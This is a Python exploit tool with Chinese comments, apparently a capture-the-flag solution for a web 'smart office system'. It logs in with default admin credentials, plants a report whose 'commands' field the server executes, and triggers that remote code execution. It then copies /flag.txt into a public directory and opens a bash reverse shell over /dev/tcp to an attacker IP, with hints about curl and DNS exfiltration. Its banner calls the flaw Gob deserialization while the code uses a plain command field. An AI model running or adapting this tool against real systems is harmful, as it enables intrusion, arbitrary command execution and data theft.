#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import base64
import json
import sys
import time
import argparse
from urllib.parse import urljoin


class OfficeSystemExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def login(self, username="admin", password="admin"):
        """登录系统"""
        print(f"[+] 尝试登录用户: {username}")
        
        login_url = urljoin(self.target_url, '/login')
        data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(login_url, data=data, allow_redirects=False)
        
        if response.status_code == 302 and 'dashboard' in response.headers.get('Location', ''):
            print("[+] 登录成功!")
            return True
        else:
            print("[-] 登录失败")
            return False
    
    def create_malicious_report(self, command):
        """创建包含恶意payload的分析报告"""
        print(f"[+] 创建恶意分析报告，执行命令: {command}")
        
        # 构造恶意的JSON数据 - 利用模板功能的RCE漏洞
        # 这个格式看起来像是正常的报告模板定义
        fake_data = {
            "data": {
                "type": "system_analysis",
                "period": "monthly",
                "metrics": ["cpu", "memory", "disk"]
            },
            "template": {
                "template_type": "dynamic",
                "fields": ["performance", "usage"],
                # 关键：commands字段会被执行
                "commands": [command]
            }
        }
        
        create_url = urljoin(self.target_url, '/analytics/create')
        form_data = {
            'title': '系统性能分析报告',
            'description': '详细的系统性能分析数据，包含缓存优化建议',
            'data': json.dumps(fake_data)
        }
        
        response = self.session.post(create_url, data=form_data)
        
        if response.status_code == 200:
            result = response.json()
            if 'id' in result:
                report_id = result['id']
                print(f"[+] 报告创建成功，ID: {report_id}")
                return report_id
        
        print("[-] 报告创建失败")
        return None
    
    def trigger_vulnerability(self, report_id):
        """触发漏洞 - 访问报告详情页面"""
        print(f"[+] 触发漏洞 - 访问报告 {report_id}")
        
        view_url = urljoin(self.target_url, f'/analytics/{report_id}')
        print(f"[+] 访问URL: {view_url}")
        
        response = self.session.get(view_url)
        
        if response.status_code == 200:
            print("[+] 漏洞触发成功! (页面访问正常)")
            print("[+] 等待命令执行...")
            time.sleep(2)  # 给命令执行时间
            return True
        else:
            print(f"[-] 漏洞触发失败 (状态码: {response.status_code})")
            return False
    
    def check_command_execution(self, test_file="/tmp/rce_test"):
        """检查命令是否执行成功"""
        print("[+] 检查命令执行结果...")
        
        # 等待命令执行
        time.sleep(2)
        
        # 尝试创建一个测试文件到web目录来验证RCE
        test_command = "echo 'RCE_SUCCESS_$(date)' > /app/static/rce_test.txt"
        
        print("[+] 创建验证测试...")
        report_id = self.create_malicious_report(test_command)
        if report_id:
            # 触发第二次漏洞来创建测试文件
            view_url = urljoin(self.target_url, f'/analytics/{report_id}')
            self.session.get(view_url)
            
            time.sleep(2)
            
            # 检查测试文件是否存在
            try:
                test_url = urljoin(self.target_url, '/static/rce_test.txt')
                response = self.session.get(test_url)
                
                if response.status_code == 200:
                    content = response.text.strip()
                    if 'RCE_SUCCESS' in content:
                        print(f"[+] 命令执行验证成功: {content}")
                        return True
                    else:
                        print("[-] 测试文件内容异常")
                else:
                    print("[-] 无法访问测试文件")
            except Exception as e:
                print(f"[-] 验证过程出错: {e}")
        
        print("[!] 如果命令执行成功，应该能看到相应的效果")
        print("[!] 例如：文件创建、网络连接、进程启动等")
        
        return True
    
    def exploit_rce(self, command):
        """完整的RCE漏洞利用流程"""
        print("="*60)
        print("智能办公管理系统 Redis 反序列化 RCE 漏洞利用")
        print("="*60)
        
        # 步骤1：登录系统
        if not self.login():
            return False
        
        # 步骤2：创建恶意报告
        report_id = self.create_malicious_report(command)
        if not report_id:
            return False
        
        # 步骤3：触发漏洞
        if not self.trigger_vulnerability(report_id):
            return False
        
        # 步骤4：验证命令执行
        self.check_command_execution()
        
        print("[+] 漏洞利用完成!")
        return True
    
    def get_flag(self):
        """获取flag的特殊利用"""
        print("[+] 尝试获取flag...")
        
        # 将flag写入到web可访问目录
        flag_command = "cat /flag.txt > /app/static/flag_result.txt"
        
        if self.exploit_rce(flag_command):
            print("[+] 已执行获取flag命令")
            print("[+] 尝试通过web路径获取结果...")
            
            # 等待文件写入
            time.sleep(3)
            
            # 尝试访问结果文件
            try:
                flag_url = urljoin(self.target_url, '/static/flag_result.txt')
                response = self.session.get(flag_url)
                
                if response.status_code == 200:
                    flag_content = response.text.strip()
                    if flag_content:
                        print(f"\n🎉 成功获取 FLAG: {flag_content}")
                        return True
                    else:
                        print("[-] flag文件为空")
                else:
                    print(f"[-] 无法访问flag文件 (状态码: {response.status_code})")
            except Exception as e:
                print(f"[-] 获取flag时出错: {e}")
            
            print("\n[!] 如果上述方法失败，可以尝试其他外带方式：")
            print("    1. curl 命令发送到远程服务器")
            print("    2. DNS 查询外带")
            print("    3. 反向shell获取")
            
            return True
        
        return False
    
    def reverse_shell(self, attacker_ip, attacker_port):
        """反向shell利用"""
        print(f"[+] 尝试建立反向shell到 {attacker_ip}:{attacker_port}")
        
        # 构造反向shell命令
        shell_command = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'"
        
        return self.exploit_rce(shell_command)


def print_banner():
    """打印横幅"""
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║              智能办公管理系统 RCE 漏洞利用工具                ║
    ║                                                              ║
    ║  漏洞类型: Golang Gob 反序列化 RCE                           ║
    ║  影响组件: Redis 缓存 + 数据分析模块                          ║
    ║  危险等级: 高危 (RCE)                                        ║
    ║                                                              ║
    ║  使用方法:                                                   ║
    ║    python3 exploit.py -t http://target:8080 -c "command"    ║
    ║    python3 exploit.py -t http://target:8080 --flag          ║
    ║    python3 exploit.py -t http://target:8080 --shell ip port ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)


def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description='智能办公管理系统 RCE 漏洞利用工具')
    parser.add_argument('-t', '--target', required=True, help='目标URL (例如: http://192.168.1.100:8080)')
    parser.add_argument('-c', '--command', help='要执行的命令')
    parser.add_argument('--flag', action='store_true', help='尝试获取flag')
    parser.add_argument('--shell', nargs=2, metavar=('IP', 'PORT'), help='反向shell (IP PORT)')
    parser.add_argument('--check', action='store_true', help='检查目标是否存在漏洞')
    
    args = parser.parse_args()
    
    if not any([args.command, args.flag, args.shell, args.check]):
        print("[-] 请指定要执行的操作：-c 命令执行, --flag 获取flag, --shell 反向shell, --check 漏洞检查")
        sys.exit(1)
    
    exploit = OfficeSystemExploit(args.target)
    
    try:
        if args.check:
            # 漏洞检查
            print("[+] 检查目标是否存在漏洞...")
            test_command = "echo 'VULN_CHECK_SUCCESS' > /app/static/vuln_check.txt"
            
            # 先尝试执行测试命令
            if exploit.login():
                report_id = exploit.create_malicious_report(test_command)
                if report_id:
                    exploit.trigger_vulnerability(report_id)
                    
                    # 检查结果
                    time.sleep(3)
                    try:
                        check_url = urljoin(args.target, '/static/vuln_check.txt')
                        response = exploit.session.get(check_url)
                        if response.status_code == 200 and 'VULN_CHECK_SUCCESS' in response.text:
                            print("[+] 漏洞检查成功：目标存在RCE漏洞！")
                            result = True
                        else:
                            print("[-] 漏洞检查失败：未检测到命令执行")
                            result = False
                    except:
                        print("[-] 漏洞检查失败：网络错误")
                        result = False
                else:
                    result = False
            else:
                result = False
            
        elif args.command:
            # 命令执行
            result = exploit.exploit_rce(args.command)
            
        elif args.flag:
            # 获取flag
            result = exploit.get_flag()
            
        elif args.shell:
            # 反向shell
            attacker_ip, attacker_port = args.shell
            result = exploit.reverse_shell(attacker_ip, attacker_port)
        
        if result:
            print("\n[+] 漏洞利用成功!")
        else:
            print("\n[-] 漏洞利用失败")
            
    except KeyboardInterrupt:
        print("\n[!] 用户中断操作")
    except Exception as e:
        print(f"\n[-] 发生错误: {e}")


if __name__ == "__main__":
    main() 